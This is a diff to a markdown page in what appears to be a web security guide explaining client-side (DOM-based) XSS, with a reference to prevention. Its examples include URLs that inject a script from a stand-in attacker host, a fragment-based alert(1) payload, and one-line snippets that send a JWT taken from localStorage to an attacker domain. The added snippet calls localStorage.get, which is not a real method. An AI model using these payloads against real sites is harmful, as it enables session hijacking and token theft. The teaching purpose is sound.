@@ -1,42 +1,58 @@
 Client XSS
 ==========
 
-DOM based XSS is similar to persistent and reflected XSS's, but with one subtle,
-but very important distinction - the malicious JavaScript won't be loaded when
-the page loads, instead, the malicious JS executes as a result of treating user
-input in an unsafe way.
+Per definition "_Client XSS occurs when untrusted user supplied data is used to
+update the DOM with an unsafe JavaScript call. A JavaScript call is considered
+unsafe if it can be used to introduce valid JavaScript into the DOM._".
+([source][1]).
 
-An easy way to understand this type of vulnerability is to consider pages that
-dynamically update content without refreshing the whole page. The technology that
-allows for this to happen, is AJAX. And AJAX is essentially JavaScript and XML.
+The "untrusted user supplied data" has multiple sources like the DOM itself,
+the URL e.g a query string parameter or the fragment or even from a server
+request. Client side store locations like Cookies or Local Storage are also
+potential sources of XSS payloads.
 
 As an example consider the following script used to display ads on a website:
+
 ```JavaScript
 document.write('<script type="text/JavaScript" src="' + (location.search.split('req=')[1] || '') + '"></scr'+'ipt>');
 ```
 
 Since the `location.search.split` is not properly escaped, the `req` parameter
 can be manipulated by an attacker to retrieve malicious JavaScript from a
-third-party domain and inject it into the web page the victim is visiting.
-`
-http://www.example.com/ads/displayad.html?req=https://www.attacker.com/poc/xss.js
-`
-To perform this attack, an attacker creates a URL as the one above, and a user
-upon clicking it, would execute the contents of the malicious script in their
-browser.
+location he is in control of, injecting it into the web page the victim is
+visiting.
 
-There is another type of XSS that take advantage of features that are client-side  
-only. This means that through these techniques, no logs are ever recorded on the
-server.
+```
+http://www.example.com/?req=https://www.attacker.com/poc/xss.js
+```
 
-A simple example of each feature is presented:
+To perform this attack, an attacker crafts an URL like the one above, sending it
+to the victim. Upon clicking it the `https://www.attacker.com/poc/xss.js` script
+is requested by the Ad snippet making it run in the `www.example.com` context.
 
-### Fragment identifiers:
+This could be the initial step of a [Session Hijacking attack][2] as
+attacker's script may have access to the session cookie (if it was not properly
+set as `httpOnly`) or to the `localStorage` where a JSON Web Token (JWT) may be
+found
+
+```javascript
+(new Image).src = '//attacer.com?jwt='+localStorage.get('JWT');
+```
+
+The sample above is a common example of how to exfiltrate data, bypassing the
+[Same Origin Policy][3] as the `JWT` value read from `localStorage` is sent as
+part of the URL from where an image was supposed to be loaded.
+
+
+As said before the "untrusted data" sources are vary.
+Some client-side frameworks use the URL fragment to identify resources or
+application states: although the fragment is part of the URL it is not sent to
+the sever.
 
 The following script is very simple and for demonstration purposes only, but
-encompasses the concept.
+encompasses the concept of URL fragment as source of untrusted data. Assuming
+that the following script is somewhere in the target page
 
-If this script was on a page:
 ```html
 <script>
 x=location.hash.slice(1);
@@ -44,40 +60,16 @@ document.write(x)
 </script>
 ```
 
-Then the following URL:
+then the following URL would trigger the famous `alert(1)` modal.
+
 ```
 http://example.com/fragment.html#<script>alert(1)</script>
 ```
 
-would trigger a XSS based on the fragment identifier.
+To know how to prevent XSS in general please follow to [How to prevent XSS
+section][4].
 
-### Local Storage
-
-Another feature called `Local Storage` introduced with HTML5 also allows for
-DOM based XSS's without the server logging.
-
-`Local Storage` allows application data to be stored locally in the user's browser,
-without resorting to cookies. There are several differences from cookies.
-It is usually regarded as more secure and more performant than cookies, it also
-allows a larger storage limit (5MB).
-
-It should be noted that both `cookies` and `localStorage` are protected from
-unrelated domains by the `Same-Origin Policy`.
-
-For our demonstration, the feature we will focus on is the fact that the
-data stored with `localStorage` is never sent to the server.
-This is what allows the DOM-XSS to be performed without logs on the server-side.
-
-A simple example:
-```html
-<script>
-//Save our sample data
-localStorage.setItem("JWT", "JWTTOKEN");
-
-document.write("new Image().src='http://www.attacker.com?token="+localStorage.getItem('JWT')+"'>");
-</script>
-```
-
-An important security detail to keep in mind is that the `localStorage` object
-stores the data without an expiration date. This means that the data will not be
-deleted when the browser is closed.
+[1]: https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS
+[2]: https://www.owasp.org/index.php/Session_hijacking_attack
+[3]: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
+[4]: how-to-prevent.md
